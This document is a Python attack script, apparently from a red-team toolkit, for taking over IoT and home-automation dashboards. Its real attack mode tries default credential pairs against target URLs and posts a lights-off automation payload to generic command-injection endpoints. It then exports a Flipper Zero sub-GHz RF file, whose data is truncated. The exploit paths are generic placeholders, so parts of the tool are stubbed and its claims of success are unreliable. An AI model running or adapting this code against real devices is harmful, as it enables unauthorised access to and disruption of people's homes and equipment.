#!/usr/bin/env python3
# dashboard_override.py – Unified Stealth/Real IoT Override

import requests
import argparse
import time
import os
from datetime import datetime

# === Configuration ===
DEFAULT_CREDENTIALS = [('admin', 'admin'), ('root', 'toor'), ('user', 'user')]
CVE_PATHS = ['/api/config/script', '/system/exec', '/cgi-bin/rce.cgi']
HEADERS = {'User-Agent': 'REDoT-Agent/1.0'}

# === Target List ===
TARGETS = [
    'http://192.168.1.100:8123',
    'http://192.168.1.101:8080',
]

# === Argument Parsing ===
parser = argparse.ArgumentParser(description='IoT Dashboard Override Attack Module')
parser.add_argument('--stealth', action='store_true', help='Run in stealth (simulated) mode')
parser.add_argument('--targets', type=str, help='File with target URLs (one per line)')
args = parser.parse_args()

if args.targets and os.path.exists(args.targets):
    with open(args.targets, 'r') as f:
        TARGETS = [line.strip() for line in f if line.strip()]

timestamp = datetime.now().strftime('%Y-%m-%d_%H%M%S')
log_file = f"logs/dashboard_override_{timestamp}.log"
os.makedirs("logs", exist_ok=True)

# === Logger ===
def log(msg):
    print(msg)
    with open(log_file, 'a') as f:
        f.write(msg + '\n')

# === Simulated Mode ===
def stealth_mode():
    log("Dashboard Override Module [STEALTH MODE]")
    for url in TARGETS:
        log(f"\n[+] Probing {url}...")
        time.sleep(0.5)
        log("    -> Attempting default login (admin:admin)... [SIM FAIL]")
        time.sleep(0.5)
        log("    -> Attempting CVE exploit for remote command injection... [SIM SUCCESS]")
        log(f"    -> Injected rogue automation: 'Turn off lights every 5 sec' at {url}")
    log("\n[✓] Stealth simulation complete.")

# === Real Attack Mode ===
def real_mode():
    log("Dashboard Override Module [REAL ATTACK MODE]")
    for url in TARGETS:
        log(f"\n[+] Probing {url}...")
        success = False
        for user, pwd in DEFAULT_CREDENTIALS:
            try:
                resp = requests.post(f"{url}/login", data={'username': user, 'password': pwd}, headers=HEADERS, timeout=5)
                if resp.status_code in [200, 302]:
                    log(f"    -> Login success with {user}:{pwd}")
                    success = True
                    break
                else:
                    log(f"    -> Login failed with {user}:{pwd}")
            except Exception as e:
                log(f"    -> Error connecting: {e}")

        for path in CVE_PATHS:
            try:
                payload_url = f"{url}{path}"
                payload = {"script": "automation.turn_off_all_lights()"}
                resp = requests.post(payload_url, json=payload, headers=HEADERS, timeout=5)
                if resp.status_code == 200:
                    log(f"    -> Exploit delivered at {payload_url}")
                    log(f"    -> Injected automation at {url}")
                    success = True
                    break
            except Exception as e:
                log(f"    -> Exploit error: {e}")

        if success:
            export_flipper_sub(url)

    log("\n[✓] Real attack execution complete. Logs saved.")

# === Optional RF Export for Flipper ===
def export_flipper_sub(url):
    safe_name = url.replace("http://", "").replace(":", "_")
    filename = f"flipper_exports/{safe_name}.sub"
    os.makedirs("flipper_exports", exist_ok=True)
    with open(filename, 'w') as f:
        f.write("Filetype: Flipper SubGhz RAW File\nVersion: 1\nFrequency: 433920000\n")
        f.write("RAW_Data: 112,452,-133,130,... [TRUNCATED]\n")
    log(f"    -> RF override exported for Flipper: {filename}")

# === Execute ===
if args.stealth:
    stealth_mode()
else:
    real_mode()
